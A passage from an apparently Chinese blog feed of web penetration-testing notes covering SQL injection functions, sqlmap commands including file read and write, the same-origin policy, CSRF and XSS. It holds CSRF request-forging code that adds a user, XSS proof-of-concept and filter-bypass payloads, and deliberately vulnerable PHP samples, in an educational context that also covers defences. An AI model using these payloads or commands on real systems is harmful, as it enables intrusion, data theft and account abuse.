class="line">&#x3D; &gt; &gt;&#x3D; &lt;&#x3D; &lt;&gt;    #比较运算符</span><br><span class="line">and or            #逻辑运算符</span><br><span class="line">version()        #mysql数据库版本</span><br><span class="line">database()        #当前数据名</span><br><span class="line">user()&#x2F;current_user()&#x2F;system_user()        #当前用户名</span><br><span class="line">@@datadir        #数据库所在路径</span><br><span class="line">@@basedir        #数据库的路径</span><br><span class="line">@@version        #数据库的版本</span><br><span class="line">@@version_compile_os;    #操作系统版本</span><br><span class="line">length()        #返回字符串长度</span><br><span class="line">mid(需要截取的字符串,从第几位开始截取(1开始),长度)            #需要截取的字符串</span><br><span class="line">substring(截取的字符串,截取起始位置1开始,长度)&#x2F;substr(arg同上)&#x2F;mid(arg同上)    #字符串的截取</span><br><span class="line">left(截取的字符串,从开始截取的位数)    #字符串的截取，意思是从头开始截取，输入位数即可</span><br><span class="line">concat(str1,str2,...)    #连接多个字符串，结果无分隔符</span><br><span class="line">concat_ws(分隔符,str1,str2,...)    #连接多个字符串，结果有分隔符</span><br><span class="line">group_concat()    #连接一个组的字符串</span><br><span class="line">ord()        #返回字符串第一个字符的 ASCII 值</span><br><span class="line">rand()        #0-1的随机浮点数</span><br><span class="line">sleep()        #睡眠</span><br><span class="line">if(expr,con1,con2)    #三目表达式，true执行con1，false执行con2</span><br><span class="line">hex() 和 unhex()    #用于 hex 编码解码</span><br></pre></td></tr></table></figure><p>4、Mysql常用语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table LIMIT 偏移量(从0开始),行数    #从查询的结果中截取几行记录    </span><br></pre></td></tr></table></figure><p>5、判断是什么数据库</p><p>1)内置数据表判断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1 and (select count(*) from XXX) &gt; 0 and 1&#x3D;1 --+ </span><br><span class="line">xxx:    msSQL数据库：sysobjects；mysql数据库：information_schema.TABLES</span><br><span class="line">        access数据库：msysobjects    oracle数据库：sys.user_tables</span><br></pre></td></tr></table></figure><p>2）特定函数判断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mysql：version()&gt;1 、 @@version&gt;1 相同，如果version()错误，则可能是msSQL</span><br></pre></td></tr></table></figure><h3 id="七、SQLmap"><a href="#七、SQLmap" class="headerlink" title="七、SQLmap"></a>七、SQLmap</h3><p>1、GET型注入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-u <span class="string">&quot;url&quot;</span>    <span class="comment">#检测目标url注入点</span></span><br><span class="line">--dbs        <span class="comment">#列出所有数据库</span></span><br><span class="line">--current-db    <span class="comment">#列出当前数据库的名字</span></span><br><span class="line">-D            <span class="comment">#指定一个数据库</span></span><br><span class="line">--tables    <span class="comment">#列出表名</span></span><br><span class="line">-T            <span class="comment">#指定表名</span></span><br><span class="line">--columns    <span class="comment">#列出所有的字段名</span></span><br><span class="line">-C            <span class="comment">#指定字段</span></span><br><span class="line">--dump        <span class="comment">#列出字段值</span></span><br></pre></td></tr></table></figure><p>2、POST型注入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、先通过bp抓一个想要测试注入的表单POST请求报文，保存到文件中。</span><br><span class="line">2、sqlmap -r POST报文文件</span><br></pre></td></tr></table></figure><p>3、文件写入读取</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--file-write <span class="string">&quot;要写的文件&quot;</span> --file-dest <span class="string">&quot;写到哪？绝对路径&quot;</span>     <span class="comment">#写入文件</span></span><br><span class="line">--file-read <span class="string">&quot;要读的文件&quot;</span>    <span class="comment">#读取文件</span></span><br></pre></td></tr></table></figure><h3 id="八、SQL自动化注入"><a href="#八、SQL自动化注入" class="headerlink" title="八、SQL自动化注入"></a>八、SQL自动化注入</h3><p>1、半自动化注入：Burp</p><p>2、全自动化注入：sqlmap、定制化脚本</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>同源策略</title>
      <link href="/2020/08/04/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/6%E3%80%81%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"/>
      <url>/2020/08/04/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/6%E3%80%81%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><blockquote><p>为了保证浏览器的安全，只允许本域名下的接口交互。如果不同源，并且没有授权，无法读写对方的资源。</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy">https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy</a></p></blockquote><h3 id="一、什么是同源？"><a href="#一、什么是同源？" class="headerlink" title="一、什么是同源？"></a>一、什么是同源？</h3><p>Web内容的源由用于访问它的<a href="https://developer.mozilla.org/en-US/docs/Glossary/URL">URL</a> 的方案(协议)，主机(主机名和域名)和端口定义。只有当方案，主机和端口都匹配时，两个对象具有相同的起源。</p><h3 id="什么是同源策略？"><a href="#什么是同源策略？" class="headerlink" title="什么是同源策略？"></a>什么是同源策略？</h3><p><strong>同源策略</strong>是一个重要的安全策略，它用于限制一个源的文档或者它加载的脚本如何能与另一个源的资源进行交互。它能帮助阻隔恶意文档，减少可能被攻击的媒介。</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF</title>
      <link href="/2020/08/04/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/5%E3%80%81CSRF/"/>
      <url>/2020/08/04/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/5%E3%80%81CSRF/</url>
      
        <content type="html"><![CDATA[<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="一、CSRF简介"><a href="#一、CSRF简介" class="headerlink" title="一、CSRF简介"></a>一、CSRF简介</h3><p>CSRF，全名 Cross Site Request Forgery，跨站请求伪造。很容易将它与 XSS 混淆，对于 CSRF，其两个关键点是跨站点的请求与请求的伪造，由于目标站无 token 或 referer 防御，导致用户的敏感操作的每一个参数都可以被攻击者获知，攻击者即可以伪造一个完全一样的请求以用户的身份达到恶意目的。</p><h3 id="二、CSRF的攻击手段"><a href="#二、CSRF的攻击手段" class="headerlink" title="二、CSRF的攻击手段"></a>二、CSRF的攻击手段</h3><p><a href="https://imgchr.com/i/a0ruuT"><img src="https://s1.ax1x.com/2020/08/04/a0ruuT.png" alt="a0ruuT.png"></a></p><blockquote><p>Get方式：`&lt;img src=”攻击url构造” alt /&gt;即可</p><p>使用XMLHttpRequest对象构造HTTP Post请求报文，这段恶意的js代码可以通过XSS等方式交由受害者执行。</p></blockquote><h3 id="三、CSRF-类型"><a href="#三、CSRF-类型" class="headerlink" title="三、CSRF 类型"></a>三、CSRF 类型</h3><blockquote><p>按请求类型，可分为 GET 型和 POST 型。</p><p>按攻击方式，可分为 HTML CSRF、JSON HiJacking、Flash CSRF 等。</p></blockquote><h3 id="1、HTML-CSRF"><a href="#1、HTML-CSRF" class="headerlink" title="1、HTML CSRF"></a>1、HTML CSRF</h3><p>利用 HTML 元素发出 CSRF 请求，这是最常见的 CSRF 攻击。</p><p>HTML 中能设置 <code>src/href</code> 等链接地址的标签都可以发起一个 GET 请求，如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">lowsrc</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">dynsrc</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;0; url=&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bgsound</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bgsound</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bgsound</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">background</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>还有 CSS 样式中的：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@import</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="attribute">background:</span>url(<span class="string">&quot;&quot;</span>)</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>也可使用表单来对 POST 型的请求进行伪造。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://www.a.com/register&quot;</span> <span class="attr">id</span>=<span class="string">&quot;register&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> f = <span class="built_in">document</span>.getElementById(<span class="string">&quot;register&quot;</span>);</span></span><br><span class="line"><span class="javascript">  f.inputs[<span class="number">0</span>].value = <span class="string">&quot;test&quot;</span>;</span></span><br><span class="line"><span class="javascript">  f.inputs[<span class="number">1</span>].value = <span class="string">&quot;passwd&quot;</span>;</span></span><br><span class="line">  f.submit();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>或者使用ajax对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; xmlhttp=<span class="keyword">new</span> XMLHttpRequest(); xmlhttp.open(\<span class="string">&#x27;post\&#x27;,\&#x27;http://127.0.0.1/cms/cms/admin/user.action.php\&#x27;,false );</span></span><br><span class="line"><span class="string">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;); xmlhttp.send(\&#x27;act=add&amp;username=xiaomao&amp;password=123456&amp;password2=123456&amp;button=%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7&amp;userid=0\&#x27;); &lt;/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2、Flash-CSRF"><a href="#2、Flash-CSRF" class="headerlink" title="2、Flash CSRF"></a>2、Flash CSRF</h3><p>Flash 也有各种方式可以发起网络请求，包括 POST。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flash.net.URLRequest;</span><br><span class="line"><span class="keyword">import</span> flash.system.Security;</span><br><span class="line"><span class="keyword">var</span> url = <span class="keyword">new</span> URLRequest(<span class="string">&quot;http://target/page&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> param = <span class="keyword">new</span> URLVariables();</span><br><span class="line">param = <span class="string">&quot;test=123&quot;</span>;</span><br><span class="line">url.method = <span class="string">&quot;POST&quot;</span>;</span><br><span class="line">url.data = param;</span><br><span class="line">sendToURL(url);</span><br><span class="line">stop();</span><br></pre></td></tr></table></figure><p>Flash 中还可以使用 <code>getURL</code>、<code>loadVars</code> 等方式发起请求。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">req = <span class="keyword">new</span> LoadVars();</span><br><span class="line">req.addRequestHeader(<span class="string">&quot;foo&quot;</span>, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line">req.send(<span class="string">&quot;http://target/page?v1=123&amp;v2=222&quot;</span>, <span class="string">&quot;_blank&quot;</span>, <span class="string">&quot;GET&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="四、CSRF的防御"><a href="#四、CSRF的防御" class="headerlink" title="四、CSRF的防御"></a>四、CSRF的防御</h3><h4 id="1、验证码-二次验证"><a href="#1、验证码-二次验证" class="headerlink" title="1、验证码/二次验证"></a>1、验证码/二次验证</h4><p>验证码强制用户必须与应用进行交互，才能完成最终请求。</p><h4 id="2、Token"><a href="#2、Token" class="headerlink" title="2、Token"></a>2、Token</h4><blockquote><p>不要放在cookie中，否则CSRF访问也会带着cookie去。</p></blockquote><p>CSRF 能够攻击成功的本质原因是重要操作的所有参数都可以被攻击者猜测得到。</p><p>保持原参数不变，新增一个参数 Token，值是随机的，在实际应用中，Token 可以放在用户的 Session 中，或浏览器的 Cookies 中。</p><p>Token 一定要足够随机。此外，Token 的目的不是为了防止重复提交，所以为了使用方便，可以允许在一个用户的有效生命周期内，在 Token 消耗掉之前都使用同一个 Token，但如果用户已经提交了表单，则这个 Token 已经消耗掉，应该重新生成 Token。</p><p>Token 还应注意其保密性，如果 Token 出现在 URL 中，则可能会通过 Referer 泄露，应尽量把 Token 放在表单中，把敏感操作由 GET 改为 POST，以表单或 AJAX 的形式提交，避免 Token 泄露。</p><h4 id="3、检查HTTP请求报文中的Referer字段：（并不完美）"><a href="#3、检查HTTP请求报文中的Referer字段：（并不完美）" class="headerlink" title="3、检查HTTP请求报文中的Referer字段：（并不完美）"></a>3、检查HTTP请求报文中的Referer字段：（并不完美）</h4><p>即便是最新的浏览器的安全特性规定无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/2020/08/04/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4%E3%80%81XSS/"/>
      <url>/2020/08/04/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4%E3%80%81XSS/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="一、什么是XSS"><a href="#一、什么是XSS" class="headerlink" title="一、什么是XSS"></a>一、什么是XSS</h3><p>跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p><p>Cross Site Scripting由于缩写和CSS相同，更名为XSS。XSS是基于Javascript代码的安全缺陷来完成恶意的攻击行为。 因为Javascript语言对浏览器对象操作的强大性，因此它的攻击能力很强。</p><blockquote><p>通过对JS代码的精心构造，使其注入到服务器端的网页，使得浏览器解释或者运行这段代码来达到攻击的目的。</p></blockquote><h3 id="二、XSS漏洞验证"><a href="#二、XSS漏洞验证" class="headerlink" title="二、XSS漏洞验证"></a>二、XSS漏洞验证</h3><blockquote><p>使用代码检测和验证漏洞的存在，这个过程叫Proof of Concept</p><p>EXP(Exploit)    漏洞的完整利用工具</p><p>shellcode    利用漏洞所执行的代码</p><p>payload        攻击载荷</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;confirm(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;prompt(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script &quot;&#39;Oonn&gt;</span><br></pre></td></tr></table></figure><h3 id="三、XSS的分类"><a href="#三、XSS的分类" class="headerlink" title="三、XSS的分类"></a>三、XSS的分类</h3><h4 id="1、反射性XSS攻击-non-persistent-XSS"><a href="#1、反射性XSS攻击-non-persistent-XSS" class="headerlink" title="1、反射性XSS攻击(non-persistent XSS)"></a>1、反射性XSS攻击(non-persistent XSS)</h4><p>攻击者构造的输入参数并不会在服务器端持久化存储，而是临时反射回用户端。这种攻击会通过发送给肉鸡带有构造恶意参数的url，诱导他触发其中的js代码，从而达到攻击目的。</p><p><strong>服务端代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . $_GET[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，代码直接引用了 <code>name</code> 参数，并没有做任何的过滤和检查，并且将输入直接打印在网页中返回给客户端，存在明显的 XSS 漏洞。</p><h4 id="2、存储性XSS攻击-persistent-XSS"><a href="#2、存储性XSS攻击-persistent-XSS" class="headerlink" title="2、存储性XSS攻击(persistent XSS)"></a>2、存储性XSS攻击(persistent XSS)</h4><p>持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。</p><p>此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p><blockquote><p>攻击者构造的恶意代码会在服务器端持久化存储。此数据每当被网页取出处理并发送给客户端时，此客户端就会惨遭其中所携带的js代码攻击。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = mysql_real_escape_string( $message );</span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = mysql_real_escape_string( $name );</span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">    <span class="comment">//mysql_close(); &#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码只对一些空白符、特殊符号、反斜杠进行了删除或转义，没有做 XSS 的过滤和检查，且存储在数据库中，明显存在存储型 XSS 漏洞。</p><h4 id="3、DOM-XSS"><a href="#3、DOM-XSS" class="headerlink" title="3、DOM XSS"></a>3、DOM XSS</h4><p>传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。</p><p><strong>服务器端的网页代码</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM-XSS test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> a=<span class="built_in">document</span>.URL;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.write(a.substring(a.indexOf(<span class="string">&quot;a=&quot;</span>)+<span class="number">2</span>,a.length));</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>触发条件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;domXSS.html?a&#x3D;&lt;script&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h3 id="四、XSS的构造"><a href="#四、XSS的构造" class="headerlink" title="四、XSS的构造"></a>四、XSS的构造</h3><p>1、<code>&lt;script&gt;&lt;/script&gt;、&lt;html&gt;&lt;/html&gt;标签构造</code></p><p>2、伪协议（高版本浏览器处于安全防护已经不支持，低版本IE&lt;=6可）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>touch me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&quot;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background-image:url(javascript:alert(/xss/))&gt;&quot;</span></span></span><br></pre></td></tr></table></figure><p>3、通过事件触发XSS</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Windows事件、Form事件、Keyboard事件、Mouse事件、Media事件</span></span><br><span class="line">&lt;img src=<span class="string">&quot;XXX&quot;</span> mouseover/onkeydown/onerror...=<span class="string">&quot;alert(/xss/)&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><h3 id="五、XSS的变形构造-绕过过滤器"><a href="#五、XSS的变形构造-绕过过滤器" class="headerlink" title="五、XSS的变形构造/绕过过滤器"></a>五、XSS的变形构造/绕过过滤器</h3><p>1、大小写转换(Html对大小写不敏感、JS对大小写敏感)，尽管HTML对字母大小写的使用并不敏感，但是某些后端编程语言的函数，对于字母大小写的不同却有着不同的处理方式，因此可以尝试大小写的变换，测试能否绕过函数的检查。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;Img sRc=<span class="string">&#x27;#&#x27;</span> Onerror=<span class="string">&quot;alert(/xss/)&quot;</span> /&gt;</span><br><span class="line">&lt;a hREf=<span class="string">&quot;javaScript:alert(/xss/)&quot;</span>&gt;touch me!&lt;/a&gt;    </span><br></pre></td></tr></table></figure><p>2、引号的使用：尽管HTML对引号的使用并不敏感，但是某些后端编程语言的函数，对于引号的不同却有着不同的处理方式，因此可以尝试多种引号的使用，测试能否绕过函数的检查。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&#x27;#&#x27;</span> oner</span><br><span class="line">ror=&#x27;alert(/xss/)&#x27; /&gt;    #单引号</span><br><span class="line">&lt;img src=&#x27;#&#x27; 